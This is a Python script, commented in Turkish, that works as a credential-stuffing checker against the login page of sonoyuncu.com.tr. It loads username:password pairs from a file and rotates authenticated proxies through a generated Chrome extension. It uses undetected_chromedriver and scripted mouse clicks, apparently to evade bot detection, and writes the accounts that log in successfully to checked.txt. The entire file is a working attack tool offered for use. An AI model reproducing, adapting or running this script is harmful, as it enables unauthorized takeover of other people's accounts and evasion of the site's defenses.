import os
import time
import pyautogui
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import undetected_chromedriver as uc

# Dosya adları
ACCOUNT_FILE = "accounts.txt"
PROXY_FILE = "proxies.txt"
CHECKED_FILE = "checked.txt"
BACKGROUND_JS_PATH = "C:\\Users\\yanak\\Desktop\\solog\\http_proxy_auth_plugin\\background.js"

LOGIN_URL = "https://sonoyuncu.com.tr/giris-yap"
SUCCESS_URL = "https://sonoyuncu.com.tr/ben"

PLUGIN_PATH = "C:\\Users\\yanak\\Desktop\\solog\\http_proxy_auth_plugin"

def get_driver():
    options = uc.ChromeOptions()
    options.headless = False
    options.add_argument(f'--load-extension={PLUGIN_PATH}')
    
    driver = uc.Chrome(options=options)
    return driver

def load_list(file):
    with open(file, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

accounts = load_list(ACCOUNT_FILE)
proxies = load_list(PROXY_FILE)

def save_working_account(username, password):
    with open(CHECKED_FILE, "a", encoding="utf-8") as f:
        f.write(f"{username}:{password}\n")

def update_proxy(proxy):
    try:
        ip, port, username, password = proxy.split(":")
        new_proxy_config = f'''
        var config = {{
            mode: "fixed_servers",
            rules: {{
                singleProxy: {{
                    scheme: "http",
                    host: "{ip}",
                    port: parseInt("{port}")
                }},
                bypassList: ["localhost"]
            }}
        }};
        chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
        function callbackFn(details) {{
            return {{
                authCredentials: {{
                    username: "{username}",
                    password: "{password}"
                }}
            }};
        }}
        chrome.webRequest.onAuthRequired.addListener(
            callbackFn,
            {{urls: ["<all_urls>"]}},
            ["blocking"]
        );
        '''

        with open(BACKGROUND_JS_PATH, "w", encoding="utf-8") as f:
            f.write(new_proxy_config)

        print(f"[INFO] Proxy değiştirildi: {proxy}")

    except Exception as e:
        print(f"[ERROR] Proxy değiştirilirken hata oluştu: {e}")

proxy_index = 0
attempts = 0

for account in accounts:
    if ":" not in account:
        continue
    username, password = account.split(":", 1)

    if proxies:
        proxy = proxies[proxy_index % len(proxies)]
    else:
        proxy = None

    attempts += 1
    print(f"[INFO] {username} hesabı {proxy if proxy else 'proxy olmadan'} test ediliyor... ({attempts}/10)")

    if attempts == 1 and proxy:
        update_proxy(proxy)

    try:
        driver = get_driver()
        driver.maximize_window()
        driver.get(LOGIN_URL)
        time.sleep(3)

        time.sleep(3)
        x, y = 533, 372
        pyautogui.moveTo(x, y, duration=0.5)
        pyautogui.click()
        print("[INFO] İlk mouse tıklaması yapıldı.")
        time.sleep(7)

        pyautogui.click()
        print("[INFO] İkinci mouse tıklaması yapıldı.")
        time.sleep(5)

        time.sleep(3)
        username_input = driver.find_element(By.ID, "username")
        username_input.clear()
        username_input.send_keys(username)

        password_input = driver.find_element(By.ID, "password")
        password_input.clear()
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)

        time.sleep(5)

        if driver.current_url == SUCCESS_URL:
            print(f"[SUCCESS] {username} hesabı çalışıyor!")
            save_working_account(username, password)

    except Exception as e:
        print(f"[ERROR] {username} test edilirken hata oluştu: {e}")

    finally:
        driver.quit()
    if attempts >= 10:
        proxy_index += 1
        attempts = 0  

print("[INFO] Tüm hesaplar test edildi.")
